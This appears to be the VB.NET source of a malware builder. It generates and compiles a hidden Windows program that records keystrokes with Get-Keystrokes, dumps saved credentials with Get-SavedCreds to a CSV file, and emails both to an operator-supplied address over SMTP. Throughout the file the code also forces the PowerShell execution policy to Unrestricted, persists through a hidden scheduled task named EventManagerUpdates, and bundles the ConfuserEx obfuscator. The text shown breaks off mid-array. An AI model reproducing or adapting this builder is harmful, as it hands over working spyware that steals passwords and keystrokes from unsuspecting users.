Imports System.Collections.ObjectModel
Imports System.Management.Automation
Imports System.Management.Automation.Runspaces
Imports System.Text
Imports System.IO
Imports System.Net.Mail
Imports System.CodeDom.Compiler
Imports Microsoft.Win32
Imports System.Net.Mime
Imports EAGetMail
Imports System.Collections
Imports System.Text.RegularExpressions





Public Class Form1


    Public dGVzdHBhdGg As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)

    Public MyRunSpace As Runspace = RunspaceFactory.CreateRunspace()
    Dim filecontents As String
    Dim teststring() As String
    Dim sCode As String
    Dim uacIconFile As String
    Dim uacoutfile As String = ""
    Dim uacinfile As String = ""
    Dim uacinfilename As String = ""
    Dim uacstring() As String
    Dim uacCode As String
    
    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer

    Public Function ExtractResourceToDisk(ByVal ResourceName As String, ByVal FileToExtractTo As String) As Boolean

        Dim s As System.IO.Stream = System.Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(ResourceName)
        Dim ResourceFile As New System.IO.FileStream(FileToExtractTo, IO.FileMode.Create)

        Dim b(s.Length) As Byte

        s.Read(b, 0, s.Length)
        ResourceFile.Write(b, 0, b.Length - 1)
        ResourceFile.Flush()
        ResourceFile.Close()

        ResourceFile = Nothing
    End Function
   

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim regKey2 As Microsoft.Win32.RegistryKey
        regKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell", True)
        regKey2.SetValue("ExecutionPolicy", "Unrestricted")
        regKey2.Close()

        Dim path As String = dGVzdHBhdGg & "\Z33nie"
        If Not Directory.Exists(path) Then
            Directory.CreateDirectory(path)
        End If

        Dim confusedpath As String = dGVzdHBhdGg & "\Z33nie\Confuser"
        If Not Directory.Exists(confusedpath) Then
            Directory.CreateDirectory(confusedpath)
        End If

        ExtractResourceToDisk("Z33nie.errors.ps1", dGVzdHBhdGg & "\Z33nie\errors.ps1")
        ExtractResourceToDisk("Z33nie.eventmanager.ps1", dGVzdHBhdGg & "\Z33nie\eventmanager.ps1")
        ExtractResourceToDisk("Z33nie.SysConfigDataInt.xml", dGVzdHBhdGg & "\Z33nie\SysConfigDataInt.xml")
        ExtractResourceToDisk("Z33nie.ExceptionHandlers.ps1", dGVzdHBhdGg & "\Z33nie\ExceptionHandlers.ps1")
        ExtractResourceToDisk("Z33nie.TempCacheflush.xml", dGVzdHBhdGg & "\Z33nie\TempCacheflush.xml")
        ExtractResourceToDisk("Z33nie.Confuser.CLI.exe", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.CLI.exe")
        ExtractResourceToDisk("Z33nie.Confuser.CLI.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.CLI.pdb")
        ExtractResourceToDisk("Z33nie.Confuser.Core.dll", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Core.dll")
        ExtractResourceToDisk("Z33nie.Confuser.Core.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Core.pdb")
        ExtractResourceToDisk("Z33nie.Confuser.Core.xml", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Core.xml")
        ExtractResourceToDisk("Z33nie.Confuser.DynCipher.dll", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.DynCipher.dll")
        ExtractResourceToDisk("Z33nie.Confuser.DynCipher.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.DynCipher.pdb")
        ExtractResourceToDisk("Z33nie.Confuser.Protections.dll", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Protections.dll")
        ExtractResourceToDisk("Z33nie.Confuser.Protections.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Protections.pdb")
        ExtractResourceToDisk("Z33nie.Confuser.Renamer.dll", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Renamer.dll")
        ExtractResourceToDisk("Z33nie.Confuser.Renamer.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Renamer.pdb")
        ExtractResourceToDisk("Z33nie.Confuser.Runtime.dll", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Runtime.dll")
        ExtractResourceToDisk("Z33nie.Confuser.Runtime.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\Confuser.Runtime.pdb")
        ExtractResourceToDisk("Z33nie.ConfuserEx.exe", dGVzdHBhdGg & "\Z33nie\Confuser\ConfuserEx.exe")
        ExtractResourceToDisk("Z33nie.ConfuserEx.exe.config", dGVzdHBhdGg & "\Z33nie\Confuser\ConfuserEx.exe.config")
        ExtractResourceToDisk("Z33nie.ConfuserEx.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\ConfuserEx.pdb")
        ExtractResourceToDisk("Z33nie.dnlib.dll", dGVzdHBhdGg & "\Z33nie\Confuser\dnlib.dll")
        ExtractResourceToDisk("Z33nie.dnlib.pdb", dGVzdHBhdGg & "\Z33nie\Confuser\dnlib.pdb")
        ExtractResourceToDisk("Z33nie.dnlib.xml", dGVzdHBhdGg & "\Z33nie\Confuser\dnlib.xml")
        ExtractResourceToDisk("Z33nie.GalaSoft.MvvmLight.Extras.WPF4.dll", dGVzdHBhdGg & "\Z33nie\Confuser\GalaSoft.MvvmLight.Extras.WPF4.dll")
        ExtractResourceToDisk("Z33nie.GalaSoft.MvvmLight.WPF4.dll", dGVzdHBhdGg & "\Z33nie\Confuser\GalaSoft.MvvmLight.WPF4.dll")
        ExtractResourceToDisk("Z33nie.Microsoft.Practices.ServiceLocation.dll", dGVzdHBhdGg & "\Z33nie\Confuser\Microsoft.Practices.ServiceLocation.dll")
        ExtractResourceToDisk("Z33nie.Ookii.Dialogs.Wpf.dll", dGVzdHBhdGg & "\Z33nie\Confuser\Ookii.Dialogs.Wpf.dll")
        ExtractResourceToDisk("Z33nie.System.Threading.dll", dGVzdHBhdGg & "\Z33nie\Confuser\System.Threading.dll")
        ExtractResourceToDisk("Z33nie.System.Windows.Interactivity.dll", dGVzdHBhdGg & "\Z33nie\Confuser\System.Windows.Interactivity.dll")
        ExtractResourceToDisk("Z33nie.syslog64.exe", dGVzdHBhdGg & "\Z33nie\syslog64.exe")
        ExtractResourceToDisk("Z33nie.syslog32.exe", dGVzdHBhdGg & "\Z33nie\syslog32.exe")
        ExtractResourceToDisk("Z33nie.System.Windows.Forms.dll", dGVzdHBhdGg & "\Z33nie\System.Windows.Forms.dll")
        ExtractResourceToDisk("Z33nie.System.Drawing.dll", dGVzdHBhdGg & "\Z33nie\System.Drawing.dll")

    End Sub

    Sub CreateExe(ByVal Destination As String, ByVal ResourceFns As String())


        Dim cp As New CompilerParameters


        cp.ReferencedAssemblies.Add("System.dll")
        cp.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Windows.Forms.dll")
        cp.ReferencedAssemblies.Add(dGVzdHBhdGg & "\Z33nie\System.Drawing.dll")
        cp.ReferencedAssemblies.Add(Application.StartupPath & "\Resources\" & "System.Core.dll")
        cp.ReferencedAssemblies.Add(Application.StartupPath & "\Resources\" & "System.Management.Automation.dll")



        Dim mfpath As String
        mfpath = System.IO.Path.GetFullPath(Application.StartupPath & "\Resources\") & "app.manifest"
        'Dim rspath As String = "System.Windows.Forms.Application.StartupPath" + """\tmpbr.resources"""

        '/resource:C:\Users\p-k\Documents\tmpbr.resources" + " 
        cp.CompilerOptions = " /target:winexe /optimize /win32manifest:" + """" + mfpath + """"

        Dim Provider As New VBCodeProvider

        For Each psr As String In ResourceFns
            cp.EmbeddedResources.Add(psr)
        Next

        cp.GenerateExecutable = True
        cp.OutputAssembly = Destination
        cp.GenerateInMemory = False

        Dim errors As System.CodeDom.Compiler.CompilerResults = Provider.CompileAssemblyFromSource(cp, sCode)
        If errors.Errors.HasErrors Then
            MessageBox.Show(errors.Errors(0).ToString)
        End If

        Form2.Close()

    End Sub

    Sub createFileforCompile(ByVal outfile As String)

        Dim codeline94 As String
        Dim codeline122 As String
        
        Dim codeline190 As String
        Dim codeline191 As String
        Dim codeline192 As String
        Dim codeline193 As String
        Dim codeline194 As String
        Dim codeline195 As String
        Dim codeline196 As String
        Dim codeline197 As String
        Dim codeline198 As String
        Dim codeline199 As String
        Dim codeline200 As String
        Dim codeline201 As String
        Dim codeline202 As String
        Dim codeline203 As String
        Dim codeline204 As String
        Dim codeline205 As String
        Dim codeline206 As String
        Dim codeline207 As String
        Dim codeline208 As String
        Dim codeline209 As String
        Dim codeline210 As String
        Dim codeline211 As String
        Dim codeline212 As String
        Dim codeline213 As String
        Dim codeline214 As String
        Dim codeline215 As String
        Dim codeline216 As String
        Dim codeline217 As String
        Dim codeline218 As String
        Dim codeline219 As String
        Dim codeline220 As String
        Dim codeline221 As String
        Dim codeline222 As String
        Dim codeline223 As String
        Dim codeline224 As String
        Dim codeline225 As String
        Dim codeline226 As String
        Dim codeline227 As String
        Dim codeline228 As String
        Dim codeline229 As String
        Dim codeline235 As String
        Dim codeline236 As String
        Dim codeline237 As String
        Dim codeline238 As String
        Dim codeline239 As String
        Dim codeline240 As String

        Dim codeline0 As String = "Imports System.Collections.ObjectModel"
        Dim codeline1 As String = "Imports System.Management.Automation"
        Dim codeline2 As String = "Imports System.Management.Automation.Runspaces"
        Dim codeline3 As String = "Imports System.Text"
        Dim codeline4 As String = "Imports System.IO"
        Dim codeline5 As String = "Imports System.Net.Mail"
        Dim codeline6 As String = "Imports System.Windows.Forms"
        Dim codeline7 As String = "Imports System"
        Dim codeline8 As String = "Imports System.Net"
        Dim codeline9 As String = "Imports System.Text.RegularExpressions"
        Dim codeline10 As String = " "
        Dim codeline11 As String = " "
        Dim codeline12 As String = "Imports System.Timers.Timer"
        Dim codeline13 As String = "Imports System.Net.NetworkInformation"
        Dim codeline14 As String = "Imports Microsoft.Win32"
        Dim codeline15 As String = "Imports System.Diagnostics"
        Dim codeline16 As String = "Imports Microsoft.VisualBasic"
        Dim codeline17 As String = "Namespace R3s1stanc3" '+ Form2.file
        Dim codeline18 As String = "Public Class Initiation"
        Dim codeline19 As String = "Public Shared Sub Main(argus As [String]())"
        Dim codeline20 As String = "Dim FrmMainR3s1stanc3 As New Form1"
        Dim codeline21 As String = "Application.Run(FrmMainR3s1stanc3)"
        Dim codeline22 As String = "End Sub"
        Dim codeline23 As String = "End Class"
        Dim codeline24 As String = "Public Class Form1"
        Dim codeline25 As String = "Inherits System.Windows.Forms.Form"
        Dim codeline26 As String = "Declare Function SetProcessWorkingSetSize Lib " + """kernel32.dll""" + " (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer"
        Dim codeline27 As String = " "
        'Declare Ansi Function Shell Lib " + """shell32.dll""" + " (ByVal pathname As String, Optional ByVal Style As AppWinStyle = AppWinStyle.MinimizedNoFocus, Optional ByVal Wait As Boolean = True, Optional ByVal Timeout As Integer = 10000) As Integer
        Dim codeline28 As String = "Public dGVzdHBhdGg As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
        Dim codeline29 As String = "Public MyRunSpace As Runspace = RunspaceFactory.CreateRunspace()"
        Dim codeline30 As String = "Dim filecontents As String"
        Dim codeline31 As String = "Dim WithEvents Timer1 As New Timer"
        Dim codeline32 As String = "Dim mac as String"
        Dim codeline33 As String = "Dim WithEvents Timer2 As New Timer"
        Dim codeline34 As String = "Public Function Runcmd1(ByVal scriptText As String) As String"
        Dim codeline35 As String = "Dim MyStringBuilder As New StringBuilder()"
        Dim codeline36 As String = "Try"
        Dim codeline37 As String = "MyRunSpace.Open()"
        Dim codeline38 As String = "Catch ex As Exception"
        Dim codeline39 As String = "End Try"
        Dim codeline40 As String = "Dim MyPipeline As Pipeline = MyRunSpace.CreatePipeline()"
        Dim codeline41 As String = "MyPipeline.Commands.AddScript(scriptText)"
        Dim codeline42 As String = "MyPipeline.Commands.Add" + "(""" + "Out-String" + """)"
        Dim codeline43 As String = "Dim results As Collection(Of PSObject) = MyPipeline.Invoke()"
        Dim codeline44 As String = "For Each obj As PSObject In results"
        Dim codeline45 As String = "MyStringBuilder.AppendLine(obj.ToString())"
        Dim codeline46 As String = "Next"
        Dim codeline47 As String = "Return MyStringBuilder.ToString()"
        Dim codeline49 As String = "End Function"
        Dim codeline51 As String = "Public Function Runcmd2(ByVal scriptText1 As String) As String"
        Dim codeline52 As String = "Try"
        Dim codeline53 As String = "MyRunSpace.Open()"
        Dim codeline54 As String = "Catch ex As Exception"
        Dim codeline55 As String = "End Try"
        Dim codeline56 As String = "Dim MyStringBuilder As New StringBuilder()"
        Dim codeline57 As String = "Dim MyPipeline1 As Pipeline = MyRunSpace.CreatePipeline()"
        Dim codeline58 As String = "MyPipeline1.Commands.AddScript(scriptText1)"
        Dim codeline59 As String = "MyPipeline1.Commands.Add" + "(""" + "Out-String" + """)"
        Dim codeline61 As String = "Dim results As Collection(Of PSObject) = MyPipeline1.Invoke()"
        Dim codeline65 As String = "For Each obj As PSObject In results"
        Dim codeline66 As String = "MyStringBuilder.AppendLine(obj.ToString())"
        Dim codeline67 As String = "Next"
        Dim codeline69 As String = "Return MyStringBuilder.ToString()"
        Dim codeline71 As String = "End Function"
        Dim codeline90 As String = "Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick"
        Dim codeline92 As String = "'Read the file."
        If CheckBox3.Checked = False Then
            codeline94 = "filecontents = IO.File.ReadAllText" + "(""" + TextBox3.Text + """)"
        ElseIf CheckBox3.Checked = True Then
            codeline94 = " filecontents = IO.File.ReadAllText(Path.GetTempPath & " + """tmp1095.log""" + ")"
        End If
        Dim codeline96 As String = "Dim mail As New MailMessage"
        Dim codeline97 As String = "Try"
        Dim codeline99 As String = "Dim IP As String"
        Dim codeline100 As String = "IP = GetExternalIp()"
        Dim codeline101 As String = "mail.From = New MailAddress" + "(""" + TextBox6.Text + """)"
        Dim codeline102 As String = "mail.To.Add" + "(""" + TextBox4.Text + """)"
        Dim codeline104 As String = "mail.Subject = " + """1095 | """ + "+ mac + " + """ | """ + " +IP"
        Dim codeline106 As String = "Dim SMTP As New SmtpClient" + "(""" + TextBox8.Text + """)"
        Dim codeline107 As String = "SMTP.Port = " + TextBox9.Text
        Dim codeline108 As String = "mail.Body = filecontents"
        Dim codeline109 As String = "SMTP.Credentials = New System.Net.NetworkCredential" + "(""" + TextBox6.Text + """,""" + TextBox7.Text + """)"
        Dim codeline113 As String = "SMTP.EnableSsl = True"
        Dim codeline116 As String = "SMTP.Send(mail)"
        Dim codeline118 As String = "Try"
        Dim codeline120 As String = "'Clear the file."
        If CheckBox3.Checked = False Then
            codeline122 = "IO.File.WriteAllText" + "(""" + TextBox3.Text + """, String.Empty)"
        ElseIf CheckBox3.Checked = True Then
            codeline122 = "IO.File.WriteAllText(Path.GetTempPath & " + """tmp1095.log""" + ", String.Empty)"
        End If
        Dim codeline123 As String = "FlushMemory()"
        Dim codeline124 As String = "Catch ex As Exception"
        Dim codeline125 As String = "FlushMemory()"
        Dim codeline126 As String = "End Try"
        Dim codeline127 As String = "Catch ex As Exception"
        Dim codeline128 As String = "FlushMemory()"
        Dim codeline129 As String = "End Try"
        Dim codeline131 As String = "End Sub"
        Dim codeline133 As String = "Function getMacAddress() as String"
        Dim codeline134 As String = "Dim nics() As NetworkInterface = NetworkInterface.GetAllNetworkInterfaces()"
        Dim codeline135 As String = "Return nics(0).GetPhysicalAddress.ToString"
        Dim codeline136 As String = "End Function"
        Dim codeline138 As String = "Function GetExternalIp() As String"
        Dim codeline140 As String = "Dim ExternalIP As String"
        Dim codeline141 As String = "ExternalIP = (New WebClient()).DownloadString" + "(""" + "http://checkip.dyndns.org/" + """)"
        Dim codeline142 As String = "ExternalIP = (New Regex" + "(""" + "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3" + "}""" + ")) _"
        Dim codeline143 As String = ".Matches(ExternalIP)(0).ToString()"
        Dim codeline144 As String = "Return ExternalIP"
        Dim codeline145 As String = "End Function"
        Dim codeline146 As String = "Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load"
        Dim codeline147 As String = "Me.Hide()"
        Dim codeline148 As String = "Me.ShowInTaskbar = False"
        Dim codeline149 As String = "Me.WindowState = FormWindowState.Minimized"
        Dim codeline150 As String = " "
        Dim codeline151 As String = "Dim dirpath As String = dGVzdHBhdGg & " + """\SysConfigData"""
        Dim codeline152 As String = "If Not Directory.Exists(dirpath) Then"
        Dim codeline153 As String = "Directory.CreateDirectory(dirpath)"
        Dim codeline154 As String = "End If"
        Dim codeline155 As String = "Dim filelocation As String = dGVzdHBhdGg & """ + "\SysConfigData\tempc.csv"""

        Dim codeline156 As String = "ExtractResourceToDisk(" + """errors.ps1""" + ", dGVzdHBhdGg & " + """\SysConfigData\errors.ps1""" + ")"
        Dim codeline157 As String = "ExtractResourceToDisk(" + """eventmanager.ps1""" + ", dGVzdHBhdGg & " + """\SysConfigData\eventmanager.ps1""" + ")"
        Dim codeline158 As String = "ExtractResourceToDisk(" + """SysConfigDataInt.xml""" + ", dGVzdHBhdGg & " + """\SysConfigData\SysConfigDataInt.xml""" + ")"
        Dim codeline159 As String = "ExtractResourceToDisk(" + """ExceptionHandlers.ps1""" + ", dGVzdHBhdGg & " + """\SysConfigData\ExceptionHandlers.ps1""" + ")"
        Dim codeline160 As String = "Dim strFilePath0 As String = (dGVzdHBhdGg & " + """\SysConfigData\ExceptionHandlers.ps1""" + ")"
        Dim codeline161 As String = "'Try"
        Dim codeline162 As String = "Using sw1 As StreamWriter = File.AppendText(strFilePath0)"
        Dim codeline163 As String = "sw1.WriteLine(""" + "Get-SavedCreds | Export-Csv -Path """ + " + dGVzdHBhdGg + """ + "\SysConfigData\tempc.csv""" + ")"
        Dim codeline164 As String = "End Using"
        Dim codeline165 As String = "Dim RichTextBox2 as new RichTextBox"

        Dim codeline166 As String = "Dim regKey2 As Microsoft.Win32.RegistryKey"
        Dim codeline167 As String = "regKey2 = Registry.LocalMachine.OpenSubKey(""" + "SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell""" + ", True)"
        Dim codeline168 As String = "regKey2.SetValue(""" + "ExecutionPolicy""" + ", """ + "Unrestricted""" + ")"
        Dim codeline169 As String = "regKey2.Close()"

        Dim codeline170 As String = "RichTextBox2.Text = Runcmd2(dGVzdHBhdGg &" + """\SysConfigData\ExceptionHandlers.ps1""" + ")"
        Dim codeline171 As String = "System.Threading.Thread.Sleep(20000)"
        Dim codeline172 As String = "'Catch Excred as Exception"
        Dim codeline173 As String = "'End Try"
        Dim codeline174 As String = "Dim mail1 As New MailMessage"
        Dim codeline175 As String = "Try"
        Dim codeline176 As String = "mail1.From = New MailAddress" + "(""" + TextBox6.Text + """)"
        Dim codeline177 As String = "mail1.To.Add" + "(""" + TextBox4.Text + """)"
        Dim codeline178 As String = "mail1.Subject = """ + "5av3d Cr3ds"""
        Dim codeline179 As String = "mail1.Body = """ + "The credentials are in the CSV file attached with the email"""
        Dim codeline180 As String = "Dim SMTP1 As New SmtpClient" + "(""" + TextBox8.Text + """)"
        Dim codeline181 As String = "SMTP1.Port = " + TextBox9.Text
        Dim codeline182 As String = "SMTP1.EnableSsl = True"
        Dim codeline183 As String = "SMTP1.Credentials = New System.Net.NetworkCredential" + "(""" + TextBox6.Text + """,""" + TextBox7.Text + """)"
        Dim codeline184 As String = "Dim data As New Attachment(filelocation)"
        Dim codeline185 As String = "mail1.Attachments.Add(data)"
        Dim codeline186 As String = "SMTP1.Send(mail1)"
        Dim codeline187 As String = "Catch ex As Exception"
        Dim codeline188 As String = "FlushMemory()"
        Dim codeline189 As String = "End Try"

        'Dim codeline155 As String = "Dim ext1 As String = ns + " + """.errors.ps1"""
        'Dim codeline156 As String = "Dim ext2 As String = ns + " + """.eventmanager.ps1"""
        'Dim codeline157 As String = "Dim ext3 As String = ns + " + """.SysConfigDataInt.xml"""




        If CheckBox2.Checked = True Then

            codeline190 = "Try"
            codeline191 = "My.Computer.FileSystem.CopyFile(Application.ExecutablePath, dGVzdHBhdGg & " + """\SysConfigData\""" + " & IO.Path.GetFileName(Application.ExecutablePath), True)"
            codeline192 = "Catch excopy As Exception"
            codeline193 = "End Try"
            codeline194 = "Using sw As StreamWriter = New StreamWriter(dGVzdHBhdGg & " + """\SysConfigData\SysConfigDataInt.xml""" + ",True, System.Text.Encoding.Unicode" + ")"
            codeline195 = "sw.WriteLine(""" + "<UserId>"" + Environment.UserName + ""</UserId>" + """)"
            codeline196 = "sw.WriteLine(" + """<LogonType>InteractiveToken</LogonType>""" + ")"
            codeline197 = "sw.WriteLine(" + """<RunLevel>HighestAvailable</RunLevel>""" + ")"
            codeline198 = "sw.WriteLine(" + """</Principal>""" + ")"
            codeline199 = "sw.WriteLine(" + """</Principals>""" + ")"
            codeline200 = "sw.WriteLine(" + """<Settings>""" + ")"
            codeline201 = "sw.WriteLine(" + """<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>""" + ")"
            codeline202 = "sw.WriteLine(" + """<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>""" + ")"
            codeline203 = "sw.WriteLine(" + """<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>""" + ")"
            codeline204 = "sw.WriteLine(" + """<AllowHardTerminate>false</AllowHardTerminate>""" + ")"
            codeline205 = "sw.WriteLine(" + """<StartWhenAvailable>false</StartWhenAvailable>""" + ")"
            codeline206 = "sw.WriteLine(" + """<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>""" + ")"
            codeline207 = "sw.WriteLine(" + """<IdleSettings>""" + ")"
            codeline208 = "sw.WriteLine(" + """<StopOnIdleEnd>true</StopOnIdleEnd>""" + ")"
            codeline209 = "sw.WriteLine(" + """<RestartOnIdle>false</RestartOnIdle>""" + ")"
            codeline210 = "sw.WriteLine(" + """</IdleSettings>""" + ")"
            codeline211 = "sw.WriteLine(" + """<AllowStartOnDemand>true</AllowStartOnDemand>""" + ")"
            codeline212 = "sw.WriteLine(" + """<Enabled>true</Enabled>""" + ")"
            codeline213 = "sw.WriteLine(" + """<Hidden>true</Hidden>""" + ")"
            codeline214 = "sw.WriteLine(" + """<RunOnlyIfIdle>false</RunOnlyIfIdle>""" + ")"
            codeline215 = "sw.WriteLine(" + """<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>""" + ")"
            codeline216 = "sw.WriteLine(" + """<UseUnifiedSchedulingEngine>false</UseUnifiedSchedulingEngine>""" + ")"
            codeline217 = "sw.WriteLine(" + """<WakeToRun>false</WakeToRun>""" + ")"
            codeline218 = "sw.WriteLine(" + """<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>""" + ")"
            codeline219 = "sw.WriteLine(" + """<Priority>7</Priority>""" + ")"
            codeline220 = "sw.WriteLine(" + """</Settings>""" + ")"
            codeline221 = "sw.WriteLine(" + """<Actions Context=" + """ + """"""Author"""""" + """ + ">" + """)"
            codeline222 = "sw.WriteLine(" + """<Exec>""" + ")"
            codeline223 = "sw.WriteLine(""" + "<Command>""" + " + dGVzdHBhdGg & """ + "\SysConfigData\""" + " & IO.Path.GetFileName(Application.ExecutablePath) + """ + "</Command>""" + ")"
            codeline224 = "sw.WriteLine(" + """</Exec>""" + ")"
            codeline225 = "sw.WriteLine(" + """ </Actions>""" + ")"
            codeline226 = "sw.WriteLine(" + """</Task>""" + ")"
            codeline227 = "sw.close()"
            codeline228 = "End Using"
            codeline229 = "Shell(" + """schtasks.exe /Create /XML """ + " + dGVzdHBhdGg & """ + "\SysConfigData\SysConfigDataInt.xml""" + " +""" + " /TN EventManagerUpdates /F""" + ")"

        ElseIf CheckBox2.Checked = False Then

            codeline190 = " "
            codeline191 = " "
            codeline192 = " "
            codeline193 = " "
            codeline194 = " "
            codeline195 = " "
            codeline196 = " "
            codeline197 = " "
            codeline198 = " "
            codeline199 = " "
            codeline200 = " "
            codeline201 = " "
            codeline202 = " "
            codeline203 = " "
            codeline204 = " "
            codeline205 = " "
            codeline206 = " "
            codeline207 = " "
            codeline208 = " "
            codeline209 = " "
            codeline210 = " "
            codeline211 = " "
            codeline212 = " "
            codeline213 = " "
            codeline214 = " "
            codeline215 = " "
            codeline216 = " "
            codeline217 = " "
            codeline218 = " "
            codeline219 = " "
            codeline220 = " "
            codeline221 = " "
            codeline222 = " "
            codeline223 = " "
            codeline224 = " "
            codeline225 = " "
            codeline226 = " "
            codeline227 = " "
            codeline228 = " "
            codeline229 = " "
        End If

  

        Dim codeline230 As String = "Try"
        Dim codeline231 As String = "mac = getMacAddress()"
        Dim codeline232 As String = "Catch ex As Exception"
        Dim codeline233 As String = "End Try"
        Dim codeline234 As String = "Try"

        If CheckBox3.Checked = True Then
            codeline235 = "Dim RichTextBox1 as new RichTextBox"
            codeline236 = "RichTextBox1.Text = Runcmd1(dGVzdHBhdGg &" + """\SysConfigData\eventmanager.ps1""" + ")"

        ElseIf CheckBox3.Checked = False Then
            codeline235 = "Dim strFilePath1 As String = (dGVzdHBhdGg & " + """\SysConfigData\errors.ps1""" + ")"
            codeline236 = "Using sw As StreamWriter = File.AppendText(strFilePath1)"
            codeline237 = "sw.WriteLine" + "(""" + " Get-Keystrokes -LogPath " + TextBox3.Text + " -CollectionInterval " + TextBox1.Text + " -PollingInterval " + TextBox2.Text + """)"
            codeline238 = "End Using"
            codeline239 = "Dim RichTextBox1 as new RichTextBox"
            codeline240 = "RichTextBox1.Text = Runcmd1(dGVzdHBhdGg &" + """\SysConfigData\errors.ps1""" + ")"
        End If

        Dim codeline241 As String = "Dim psList() As Process"
        Dim codeline242 As String = "psList = Process.GetProcesses()"
        Dim codeline243 As String = "For Each p As Process In psList"
        Dim codeline244 As String = "If p.ProcessName = """ + "powershell""" + " Then"
        Dim codeline245 As String = "p.PriorityClass = ProcessPriorityClass.Idle"
        Dim codeline246 As String = "End If"
        Dim codeline247 As String = "Next p"



        Dim codeline248 As String = "Timer1.Interval = (" + TextBox5.Text + " * 1000)"
        Dim codeline249 As String = "Timer1.Enabled = True"
        Dim codeline250 As String = "Timer2.Interval=10000"
        Dim codeline251 As String = "Timer2.Enabled = True"
        Dim codeline252 As String = "Catch expsp As Exception"
        Dim codeline253 As String = "End Try"
        Dim codeline254 As String = " End Sub"

        Dim codeline255 As String = "Public Sub FlushMemory()"
        Dim codeline256 As String = "Try"
        Dim codeline257 As String = "GC.Collect()"
        Dim codeline258 As String = "GC.WaitForPendingFinalizers()"
        Dim codeline259 As String = "If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then"
        Dim codeline260 As String = "SetProcessWorkingSetSize(Process.GetCurrentProcess.Handle, -1, -1)"
        Dim codeline261 As String = "Dim myProcesses As Process() = Process.GetProcessesByName(""" + Form2.dfile + """)"
        Dim codeline262 As String = "Dim myProcess As Process"
        Dim codeline263 As String = "For Each myProcess In myProcesses"
        Dim codeline264 As String = "SetProcessWorkingSetSize(myProcess.Handle, -1, -1)"
        Dim codeline265 As String = "Next myProcess"
        Dim codeline266 As String = "End If"
        Dim codeline267 As String = "Catch ex As Exception"
        Dim codeline268 As String = "End Try"
        Dim codeline269 As String = "End Sub"
        Dim codeline270 As String = "Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick"
        Dim codeline271 As String = "FlushMemory()"
        Dim codeline272 As String = "End Sub"
        Dim codeline273 As String = "Public Function ExtractResourceToDisk(ByVal ResourceName As String, ByVal FileToExtractTo As String) As Boolean"
        Dim codeline274 As String = "Using s As System.IO.Stream = System.Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(ResourceName)"
        Dim codeline275 As String = "Using ResourceFile As New System.IO.FileStream(FileToExtractTo, IO.FileMode.Create)"
        Dim codeline276 As String = "Dim b(CInt(s.Length) - 1) As Byte"
        Dim codeline277 As String = "s.Read(b, 0, CInt(s.Length))"
        Dim codeline278 As String = "ResourceFile.Write(b, 0, b.Length)"
        Dim codeline279 As String = "End Using"
        Dim codeline280 As String = "End Using"
        Dim codeline281 As String = " "
        Dim codeline282 As String = "End Function"
        Dim codeline283 As String = "End Class"
        Dim codeline284 As String = "End Namespace"



        teststring = New String(284) {codeline0, codeline1, codeline2, codeline3, codeline4, codeline5, codeline6, codeline7, codeline8, codeline9, codeline10, codeline11, codeline12, codeline13, codeline14, codeline15, codeline16, codeline17, codeline18, codeline19, codeline20, codeline21, codeline22, codeline23, codeline24, codeline25, codeline26, codeline27, codeline28, codeline29, codeline30, codeline31, codeline32, codeline33, codeline34, codeline35, codeline36, codeline37, codeline38, codeline39, codeline40, codeline41, codeline42, codeline43, codeline44, codeline45, codeline46, codeline47, " ", codeline49, " ", codeline51, codeline52, codeline53, codeline54, codeline55, codeline56, codeline57, codeline58, codeline59, " ", codeline61, " ", " ", " ", codeline65, codeline66, codeline67, " ", codeline69, " ", codeline71, " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", codeline90, " ", codeline92, " ", codeline94, " ", codeline96, codeline97, " ", codeline99, codeline100, codeline101, codeline102, " ", codeline104, " ", codeline106, codeline107, codeline108, codeline109, " ", " ", " ", codeline113, " ", " ", codeline116, " ", codeline118, " ", codeline120, " ", codeline122, codeline123, codeline124, codeline125, codeline126, codeline127, codeline128, codeline129, " ", codeline131, " ", codeline133, codeline134, codeline135, codeline136, " ", codeline138, " ", codeline140, codeline141, codeline142, codeline143, codeline144, codeline145, codeline146, codeline147, codeline148, codeline149, codeline150, codeline151, codeline152, codeline153, codeline154, codeline155, codeline156, codeline157, codeline158, codeline159, codeline160, codeline161, codeline162, codeline163, 